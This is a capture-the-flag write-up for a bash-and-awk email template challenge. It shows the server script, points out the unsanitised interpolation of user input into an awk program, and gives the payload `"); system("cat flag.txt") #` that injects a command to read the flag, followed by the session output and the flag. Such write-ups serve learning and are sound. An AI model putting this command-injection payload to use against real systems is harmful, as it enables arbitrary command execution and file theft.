# Awksome template engine ✉️

### Information:
- tcp://REDACTED:REDACTED
- Localisation du flag `./flag.txt`

I establish a connection and server spit me out the code!

```
#!/usr/bin/bash

cat "${0}"

/usr/games/cowsay -f tux.cow "Bienvenue sur notre engin de génération de courriel !"

echo -n "Pour: "
read -r RECEIVER

echo -n "De: "
read -r SENDER

echo -n "Sujet: "
read -r SUBJECT

echo -n "Contenu: "
read -r MSG

echo -e "Création ...\n\n\n"

read -rd '' PROGRAM << EOF
{ 
  gsub(/:receiver:/,"${RECEIVER}");
  gsub(/:sender:/,"${SENDER}");
  gsub(/:subject:/,"${SUBJECT}");
  gsub(/:msg:/,"${MSG}");
}1
EOF

awk "${PROGRAM}" < template

exit 0
```
Like the Chip_Legend it use `:name:` as a value to template with a variable, but this time with awk


This part is the vulnerable one
```bash
{ 
  gsub(/:receiver:/,"${RECEIVER}");
  gsub(/:sender:/,"${SENDER}");
  gsub(/:subject:/,"${SUBJECT}");
  gsub(/:msg:/,"${MSG}");
}1
```

For a value of `${MSG}` = `"); system("cat flag.txt") #`
The code will become this:

```bash
{ 
  gsub(/:receiver:/,"${RECEIVER}");
  gsub(/:sender:/,"${SENDER}");
  gsub(/:subject:/,"${SUBJECT}");
  gsub(/:msg:/,""); system("cat flag.txt") #);
}1
```


```bash
# ------------------------------------------------------

 _________________________________________
/ Bienvenue sur notre engin de génération \
\ de courriel !                           /
 -----------------------------------------
   \
    \
        .--.
       |o_o |
       |:_/ |
      //   \ \
     (|     | )
    /'\_   _/`\
    \___)=(___/

Pour: 
De: 
Sujet: 
Contenu: "); system("cat flag.txt") #
Création ...
```


`FINCTF-d4082e4816e0a3059e9b7a5bb473f7`